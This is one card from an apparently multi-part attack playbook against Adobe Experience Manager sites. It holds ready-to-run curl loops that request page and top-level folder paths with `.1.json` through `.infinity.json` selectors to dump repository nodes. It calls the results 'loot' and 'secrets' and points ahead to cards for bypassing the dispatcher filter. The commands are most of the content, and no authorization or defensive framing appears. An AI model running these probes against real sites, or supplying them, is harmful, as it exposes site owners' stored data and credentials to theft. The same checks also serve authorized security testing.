# Batch 02 — Dump folders as JSON

## GOAL
Ask AEM to print folders as data (`.1.json`, `.2.json`, …). Save what works.

## TIME
~1 hour

## YOU NEED
- Batch 01 done (`T` and `PAGE`)

---

## WHY (30 seconds)

Normal sites give HTML pages.  
AEM stores everything as a tree of folders/nodes.  
If you add `.1.json` or `.3.json` to a path, AEM may dump that folder as **JSON data** (names, properties, secrets).  
The front “bouncer” (dispatcher) often blocks this — if it works, great; if not, later cards trick the bouncer.

**Kid picture:**  
`PAGE.html` = pretty book cover.  
`PAGE.1.json` = same shelf printed as a spreadsheet.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
PAGE="/content/YOUR/PAGE"
```

### 1) Dump your page (shallow → deeper)

```bash
for x in 1.json 2.json 3.json; do
  echo "=== $x ==="
  curl -sk -o /tmp/n.json -w "code=%{http_code} bytes=%{size_download}\n" \
    "$T${PAGE}.$x"
  head -c 200 /tmp/n.json; echo
done
```

### 2) Dump top folders

```bash
for p in /content /content/dam /etc /home; do
  echo "===== $p ====="
  curl -sk -o /tmp/n.json -w "code=%{http_code} bytes=%{size_download}\n" \
    "$T${p}.1.json"
  head -c 160 /tmp/n.json; echo
done
```

### 3) One deep try (then stop)

```bash
curl -sk --max-time 20 -o /tmp/inf.json -w "inf:%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.infinity.json"
head -c 200 /tmp/inf.json; echo
```

### 4) Write down

```text
JSON works: yes/no
Best URL:
Interesting names I saw:
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| JSON with `"jcr:` or lots of keys | You already have loot style access — still do 03, then maybe jump 07 |
| All 404 | Normal. Go **NEXT** (try search door, then bypasses) |
| Huge dump with secrets | Save file offline. Do not put secrets in git |

---

## NEXT
→ [03-querybuilder-direct.md](./03-querybuilder-direct.md)
